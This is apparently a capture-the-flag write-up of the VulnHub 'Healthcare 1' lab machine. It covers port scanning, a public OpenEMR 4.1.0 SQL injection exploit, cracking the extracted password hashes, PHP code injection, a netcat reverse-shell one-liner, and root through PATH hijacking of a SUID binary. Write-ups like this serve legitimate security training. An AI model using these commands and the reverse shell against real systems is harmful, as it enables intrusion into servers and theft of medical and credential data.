---
title: VulnHub - Healthcare 1
author: ret2x
date: 2021-11-08 22:13:30 +0800
categories: [Walkthrough, VulnHub]
tags: [vulnhub, sqli, rce]
image:
    path: /assets/images/healthcare/front.png
---

**Description:** A linux machine hosting an OpenEMR content management system vulnerable to SQL Injection whose login with elevated privileges allowed to inject PHP code and thus execute system commands. Unnecessary SUID permissions on a vulnerable binary allowed to get root privileges.

**Author:** v1n1v131r4

**Operating System:** Linux

**Download:** [https://www.vulnhub.com/entry/healthcare-1,522/](https://www.vulnhub.com/entry/healthcare-1,522/)

## Information Gathering
### Host Discovery

An ARP scan discovered the target machine on the local network.

```console
root@kali:~$ arp-scan -I vmnet1 192.168.179.1/24
Interface: vmnet1, type: EN10MB, MAC: 00:50:56:c0:00:01, IPv4: 192.168.179.1
WARNING: host part of 192.168.179.1/24 is non-zero
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.179.163 00:0c:29:d7:88:3c       VMware, Inc.
192.168.179.254 00:50:56:e2:c4:84       VMware, Inc.
```

### Port Scanning

A full TCP port scan discovered two available ports.

```console
root@kali:~$ nmap -n -v -T5 -p- 192.168.179.163 -oG nmap/all-tcp-ports.txt
...
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http
```

### Service Enumeration

Service detection and script scanning was performed on the target machine with nmap.

```console
root@kali:~$ nmap -sV -sC -p21,80 -v -n 192.168.179.163 -oN nmap/service-enum.txt
...
21/tcp open  ftp     ProFTPD 1.3.3d
80/tcp open  http    Apache httpd 2.2.17 ((PCLinuxOS 2011/PREFORK-1pclos2011))
|_http-favicon: Unknown favicon MD5: 7D4140C76BF7648531683BFA4F7F8C22
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 8 disallowed entries 
| /manual/ /manual-2.2/ /addon-modules/ /doc/ /images/ 
|_/all_our_e-mail_addresses /admin/ /
|_http-server-header: Apache/2.2.17 (PCLinuxOS 2011/PREFORK-1pclos2011)
|_http-title: Coming Soon 2
```

### Web Enumeration

On the main page I don't found anything, so I decided check the robots file but it was equally irrelevant.

![](/assets/images/healthcare/screenshot-1.png)

![](/assets/images/healthcare/screenshot-2.png)

Scanning with nikto reveals a possible shellshock vulnerability.

```console
root@kali:~$ nikto -h http://192.168.179.163
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.179.163
+ Target Hostname:    192.168.179.163
+ Target Port:        80
+ Start Time:         2021-11-08 08:53:53 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.2.17 (PCLinuxOS 2011/PREFORK-1pclos2011)
+ Server may leak inodes via ETags, header found with file /, inode: 264154, size: 5031, mtime: Sat Jan  6 01:21:38 2018
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ "robots.txt" contains 8 entries which should be manually viewed.
+ Uncommon header 'tcn' found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html
+ Apache/2.2.17 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-112004: /cgi-bin/test.cgi: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271).
+ OSVDB-112004: /cgi-bin/test.cgi: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278).
+ OSVDB-3092: /cgi-bin/test.cgi: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
+ 9548 requests: 0 error(s) and 13 item(s) reported on remote host
+ End Time:           2021-11-16 09:00:53 (GMT-5) (420 seconds)
---------------------------------------------------------------------------
```

I tried to exploit shellshock but wasn't possible, this looks like a rabbit hole.

![](/assets/images/healthcare/screenshot-3.png)

Further enumeration with gobuster reveals the openemr directory.

```console
root@kali:~$ gobuster dir -u http://192.168.179.163/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -e 
...
http://192.168.179.163/index                (Status: 200) [Size: 5031]
http://192.168.179.163/images               (Status: 301) [Size: 346] [--> http://192.168.179.163/images/]
http://192.168.179.163/css                  (Status: 301) [Size: 343] [--> http://192.168.179.163/css/]   
http://192.168.179.163/js                   (Status: 301) [Size: 342] [--> http://192.168.179.163/js/]    
http://192.168.179.163/vendor               (Status: 301) [Size: 346] [--> http://192.168.179.163/vendor/]
http://192.168.179.163/favicon              (Status: 200) [Size: 1406]                                    
http://192.168.179.163/robots               (Status: 200) [Size: 620]                                     
http://192.168.179.163/fonts                (Status: 301) [Size: 345] [--> http://192.168.179.163/fonts/] 
http://192.168.179.163/gitweb               (Status: 301) [Size: 346] [--> http://192.168.179.163/gitweb/]
http://192.168.179.163/phpMyAdmin           (Status: 403) [Size: 59]                                      
http://192.168.179.163/server-status        (Status: 403) [Size: 1001]                                    
http://192.168.179.163/server-info          (Status: 403) [Size: 1001]                                    
http://192.168.179.163/openemr              (Status: 301) [Size: 347] [--> http://192.168.179.163/openemr/]
```

OpenEMR is free, open source software for the health care industry, integrates medical practice management, electronic medical record (EMR) patient scheduling and electronic billing functionality.

![](/assets/images/healthcare/screenshot-4.png)

I looked for a known vulnerability for this version and a SQL Injection was found.

```console
root@kali:~$ searchsploit openemr 4.1.0
----------------------------------------------------------- --------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- --------------------------
OpenEMR 4.1.0 - 'u' SQL Injection                          | php/webapps/49742.py
Openemr-4.1.0 - SQL Injection                              | php/webapps/17998.txt
----------------------------------------------------------- --------------------------
```

So, I copied the python exploit to my current directory.

```console
root@kali:~$ searchsploit -m php/webapps/49742.py
root@kali:~$ cp 49742.py exp.py
```

## Exploitation
### SQL Injection

I analyzed the script, we just need to replace the IP address with the target machine's ip.

```console
root@kali:~$ sed -i 's/192.168.56.106/192.168.179.163/' exp.py 
root@kali:~$ grep 192 exp.py                                
url = "http://192.168.179.163/openemr/interface/login/validateUser.php?u="
```

I ran the exploit and the credentials of two users were retrieved.

```console
root@kali:~$ python3 exp.py 

   ____                   ________  _______     __ __   ___ ____ 
  / __ \____  ___  ____  / ____/  |/  / __ \   / // /  <  // __ \
 / / / / __ \/ _ \/ __ \/ __/ / /|_/ / /_/ /  / // /_  / // / / /
/ /_/ / /_/ /  __/ / / / /___/ /  / / _, _/  /__  __/ / // /_/ / 
\____/ .___/\___/_/ /_/_____/_/  /_/_/ |_|     /_/ (_)_(_)____/  
    /_/
    ____  ___           __   _____ ____    __    _               
   / __ )/ (_)___  ____/ /  / ___// __ \  / /   (_)              
  / /_/ / / / __ \/ __  /   \__ \/ / / / / /   / /               
 / /_/ / / / / / / /_/ /   ___/ / /_/ / / /___/ /                
/_____/_/_/_/ /_/\__,_/   /____/\___\_\/_____/_/   exploit by @ikuamike 

[+] Finding number of users...
[+] Found number of users: 2
[+] Extracting username and password hash...
admin:3863efef9ee2bfbc51ecdca359c6302bed1389e8
medical:ab24aed5a7c4ad45615cd7e0da816eea39e4895d
```

Before cracking we need to identify the password hash, the tool detected a possible SHA-1.

```console
root@kali:~$ echo '3863efef9ee2bfbc51ecdca359c6302bed1389e8' | hashid
Analyzing '3863efef9ee2bfbc51ecdca359c6302bed1389e8'
[+] SHA-1 
[+] Double SHA-1 
[+] RIPEMD-160 
[+] Haval-160 
[+] Tiger-160 
[+] HAS-160 
[+] LinkedIn 
[+] Skein-256(160) 
[+] Skein-512(160)
```

I copied the hashes into a file and prepared the rockyou wordlist for use it with john the ripper.

```console
root@kali:~$ echo -e "3863efef9ee2bfbc51ecdca359c6302bed1389e8\nab24aed5a7c4ad45615cd7e0da816eea39e4895d" > openemr.hash

root@kali:~$ zcat /usr/share/wordlists/rockyou.txt.gz > rockyou.txt
```

John discovered the password for the two hashes.

```console
root@kali:~$ john openemr.hash -format=RAW-SHA1 -wordlist=rockyou.txt 
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (Raw-SHA1 [SHA1 128/128 AVX 4x])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
medical          (?)
ackbar           (?)
```


### Login to OpenEMR

I logged in to OpenEMR as the admin user.

![](/assets/images/healthcare/screenshot-5.png)

![](/assets/images/healthcare/screenshot-6.png)

Ones here, in the following path I found a way to run php code.

### Remote Code Execution

**Administration > Files**

We modify the script adding the passthru function that allows us to execute system commands, and then we save it.

![](/assets/images/healthcare/screenshot-7.png)

With the following curl request we can verify that our command was interpreted correctly.

```console
root@kali:~$ curl -s http://192.168.179.163/openemr/sites/default/config.php?z=id
uid=479(apache) gid=416(apache) groups=416(apache)
```

Then, we need to start a netcat listener and execute the following curl request.

```console
root@kali:~$ curl -s http://192.168.179.163/openemr/sites/default/config.php?z=$(urlencode -m 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.179.1 443 >/tmp/f')
```

We have a reverse shell with apache privileges.

```console
root@kali:~$ nc -vlnp 443
listening on [any] 443 ...
connect to [192.168.179.1] from (UNKNOWN) [192.168.179.163] 43690
sh: no job control in this shell
sh-4.1$ python -c 'import pty;pty.spawn("/bin/bash")'   
python -c 'import pty;pty.spawn("/bin/bash")'
bash-4.1$ whoami
whoami
apache
```

Listing the SUID binaries an uncommon binary called healthcheck catches my attention.

```console
bash-4.1$ find / -perm -4000 -type f 2>/dev/null
...
/usr/bin/healthcheck
...
```

## Privilege Escalation

I downloaded the binary to the attacking machine.

```console
root@kali:~$ nc -vlnp 5656 > healthcheck

bash-4.1$ nc 192.168.179.1 5656 < /usr/bin/healthcheck
```

I decompiled the binary with cutter, and I could see a series of commands running without the absolute path, we can hijack the path of these commands to get root.

![](/assets/images/healthcare/screenshot-8.png)

### SUID Binary

I moved to the shm directory, created a symbolic link to the /bin/sh binary with the name of the clear command, exported the /dev/shm directory to the PATH environment variable, and finally ran the healthcheck binary, giving me a root shell.

```console
bash-4.1$ cd /dev/shm
bash-4.1$ ln -s /bin/sh clear
ln -s /bin/sh clear
bash-4.1$ export PATH=/dev/shm:$PATH
export PATH=/dev/shm:$PATH
bash-4.1$ echo $PATH
echo $PATH
/dev/shm:/sbin:/usr/sbin:/bin:/usr/bin
bash-4.1$ /usr/bin/healthcheck
/usr/bin/healthcheck
gpg-agent[12879]: error creating `/.gnupg/gpg-agent-info': No such file or directory
[root@localhost shm]# id
id
uid=0(root) gid=0(root) groups=0(root),416(apache)
[root@localhost shm]# cd /root                                                 
cd /root
[root@localhost root]# ls                                                      
ls
Desktop/    drakx/        healthcheck.c  sudo.rpm
Documents/  healthcheck*  root.txt       tmp/
```

Below you can see the vulnerable healthcheck.c script, and the root flag.

```console
[root@localhost root]# cat healthcheck.c                                       
cat healthcheck.c
#include<unistd.h>
void main()
{ setuid(0);
  setgid(0);
  system("clear ; echo 'System Health Check' ; echo '' ; echo 'Scanning System' ; sleep 2 ; ifconfig ; fdisk -l ; du -h");
}
```

```console
[root@localhost root]# cat root.txt                                            
cat root.txt
██    ██  ██████  ██    ██     ████████ ██████  ██ ███████ ██████      ██   ██  █████  ██████  ██████  ███████ ██████  ██ 
 ██  ██  ██    ██ ██    ██        ██    ██   ██ ██ ██      ██   ██     ██   ██ ██   ██ ██   ██ ██   ██ ██      ██   ██ ██ 
  ████   ██    ██ ██    ██        ██    ██████  ██ █████   ██   ██     ███████ ███████ ██████  ██   ██ █████   ██████  ██ 
   ██    ██    ██ ██    ██        ██    ██   ██ ██ ██      ██   ██     ██   ██ ██   ██ ██   ██ ██   ██ ██      ██   ██    
   ██     ██████   ██████         ██    ██   ██ ██ ███████ ██████      ██   ██ ██   ██ ██   ██ ██████  ███████ ██   ██ ██ 
                                                                                                                          
                                                                                                                          
Thanks for Playing!

Follow me at: http://v1n1v131r4.com


root hash: eaff25eaa9ffc8b62e3dfebf70e83a7b

```

